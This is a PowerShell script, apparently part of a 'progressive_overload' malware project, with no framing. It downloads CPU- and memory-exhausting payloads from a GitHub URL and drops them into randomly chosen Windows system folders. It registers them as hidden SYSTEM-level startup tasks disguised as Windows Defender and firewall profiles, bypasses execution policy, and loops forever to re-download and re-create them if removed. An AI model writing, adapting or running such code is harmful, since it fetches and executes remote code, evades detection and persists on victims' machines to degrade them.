$cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.ps1"
$memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.ps1"
$storageHogUri = "STORAGE_HOG_URI"
$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32",
    "$env:windir\System32\drivers",
    "$env:windir\System32\en-US",
    "$env:windir\System32\LogFiles\WMI",
    "$env:windir\System32\wbem\en-US",
    "C:\Recovery",
    "$env:temp",
    "$env:ProgramData",
    "$env:windir\SysWOW64", # after this
    "$env:appdata\SystemInformer",
    "$env:localappdata\Microsoft\Windows",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\WinSxS",
    "$env:windir\System32\spool\drivers\x64\3\en-US",
    "$env:windir\System32\spool",
    "$env:windir\System32\catroot2",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX",
    "$env:windir\ServiceProfiles\NetworkService"
)
Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami3.txt`""
$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$memHogPath = $paths[$idx]
$memHogPath = "$memHogPath\mem_hog.ps1"
iwr -Uri $memHogUri -OutFile $memHogPath

$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$storageHogPath = $paths[$idx]
$storageHogPath = "$storageHogPath\storage_hog.ps1"
# iwr -Uri $storageHogUri -OutFile $storageHogPath

$threshold = Get-Random -Minimum 80 -Maximum 86
$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$cpuHogPath = $paths[$idx]
$cpuHogPath = "$cpuHogPath\cpu_hog.ps1"
$memHogTaskName = "windows defender profile"
$storageHogTaskName = "windows firewall profile"
$memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
$storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $storageHogPath"

if(schtasks /query /tn $memHogTaskName){
    schtasks /delete /tn $memHogTaskName /f
}
if(schtasks /query /tn $storageHogTaskName){
    schtasks /delete /tn $storageHogTaskName /f
}

function Get-RamPercentage{
    $mem = Get-WmiObject -Class Win32_OperatingSystem
    $totMem = $mem.TotalVirtualMemorySize
    $free = $mem.FreeVirtualMemory
    $used = $totMem - $free
    $percent = ($used / $totMem) * 100
    return [math]::Round($percent, 2)
}

function CheckTask-And-Recreate {
    [CmdletBinding()]
    param (
        [parameter(Mandatory=$true)]
        [string]$taskName,
        [Parameter(Mandatory=$true)]
        [string]$taskRunAction
    )
    
    begin {}
    
    process {
        $tsk = schtasks /query /tn $taskName /v /fo LIST
        if(-not $tsk){
            schtasks /create /tn $taskName /tr "$taskRunAction" /ru SYSTEM /rl HIGHEST /sc onstart /f
            schtasks /run /tn $taskName
        }else{
            if($tsk -notcontains "Run As User:                          SYSTEM"){
                schtasks /end /tn $taskName
                schtasks /change /tn $taskName /ru SYSTEM /rl HIGHEST
                schtasks /run /tn $taskName
            }
        }
    }
    
    end {}
}

while ($true) {

    if(-not(Test-Path $memHogPath -PathType Leaf)){
        schtasks /end /tn $memHogTaskName
        $idx = Get-Random -Minimum 0 -Maximum $paths.Length
        $memHogPath = $paths[$idx]
        $memHogPath = "$memHogPath\mem_hog.ps1"
        iwr -Uri $memHogUri -OutFile $memHogPath
        $memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
        schtasks /change /tn $memHogTaskName /tr $memTaskRunAction
        schtasks /run /tn $memHogTaskName
    }
    # if(-not(Test-Path $storageHogPath -PathType Leaf)){
    #     schtasks /end /tn $storageHogTaskName
    #     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
    #     $storageHogPath = $paths[$idx]
    #     $storageHogPath = "$storageHogPath\storage_hog.ps1"
    #     iwr -Uri $storageHogUri -OutFile $storageHogPath
    #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $storageHogPath"
    #     schtasks /change /tn $storageHogTaskName /tr $storageTaskRunAction
    #     schtasks /run /tn $storageHogTaskName
    # }
    CheckTask-And-Recreate -taskName $memHogTaskName -taskRunAction $memTaskRunAction
    # CheckTask-And-Recreate -taskName $storageHogTaskName -taskRunAction $storageTaskRunAction

    $curr = Get-RamPercentage
    if($curr -ge $threshold){
        iwr -Uri $cpuHogUri -OutFile $cpuHogPath
        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
    }

}